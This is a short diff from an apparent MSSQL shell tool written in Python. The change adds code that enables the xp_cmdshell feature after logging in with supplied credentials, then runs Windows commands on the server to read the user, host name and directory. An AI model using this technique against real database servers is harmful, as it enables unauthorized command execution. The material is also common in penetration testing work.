@@ -67,6 +67,9 @@ def shell():
         mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
         print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)
 
+        print("Trying to enable xp_cmdshell ...")
+        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")
+
         cmd = 'echo %username%^|%COMPUTERNAME% & cd'
         mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
         (username, computername, cwd) = process_result(mssql)
